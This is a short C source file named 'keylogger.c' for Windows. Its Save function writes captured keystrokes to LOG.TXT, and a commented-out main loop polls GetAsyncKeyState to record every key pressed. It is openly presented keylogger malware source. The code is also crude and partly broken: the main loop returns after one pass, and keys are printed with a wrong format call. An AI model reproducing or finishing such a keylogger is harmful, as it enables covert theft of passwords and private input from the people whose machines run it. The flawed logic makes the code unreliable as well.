/* save it as keylogger.c  */

//#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<Winuser.h>
#include<stdlib.h>
//using namespace std;

int Save (int key, char *file);
/*
int main()
{
    char i;
    char b = 0;

   printf("This is my simple keylogger.");
   printf("\nloading... \n\n");
   system("color c");
   while(1)
   {
       for(i=8;i<=190;i++)
      {
          if(GetAsyncKeyState(i)==-32767)
          {//k
              Save(i,"LOG.TXT");
              printf("Saved...");
              if(b > 4) return 4;
              b++;
          }
        }
        return 2;
     }
return 0;
}
*/

int Save (int key,char *file)
{
	if((key==1)||(key==2))
      return 0;

   FILE *ptr;
   ptr=fopen(file,"a+");
  //cout<<key_stroke<<endl;  // just in case //if you require to show key-strokes.
// You need to care about special characters. //Code below that will do it. :)
   if(key==8)
       fprintf(ptr,"%s","[BackSpace]");

   else if(key==13)
       fprintf(ptr,"%s","\n");

   else if(key==32)
       fprintf(ptr,"%s"," ");

   else if(key==VK_TAB)
       fprintf(ptr,"%s","[TAB]");

   else if(key==VK_SHIFT)
       fprintf(ptr,"%s","[SHIFT]");

   else if(key==VK_CONTROL)
       fprintf(ptr,"%s","[CONTROL]");

   else if(key==VK_ESCAPE)
       fprintf(ptr,"%s","[ESCAPE]");

   else if(key==VK_END)
       fprintf(ptr,"%s","[END]");

   else if(key==VK_HOME)
       fprintf(ptr,"%s","HOME");

   else if(key==VK_LEFT)
       fprintf(ptr,"%s","[LEFT]");

   else if(key==VK_UP)
       fprintf(ptr,"%s","[UP]");

   else if(key==VK_RIGHT)
       fprintf(ptr,"%s","[RIGHT]");

   else if(key==VK_DOWN)
       fprintf(ptr,"%s","[DOWN]");

   else if(key==190 || key==110)
       fprintf(ptr,"%s",".");

    else
       fprintf(ptr,"%s",&key);

   fclose(ptr);

   return 0;
}
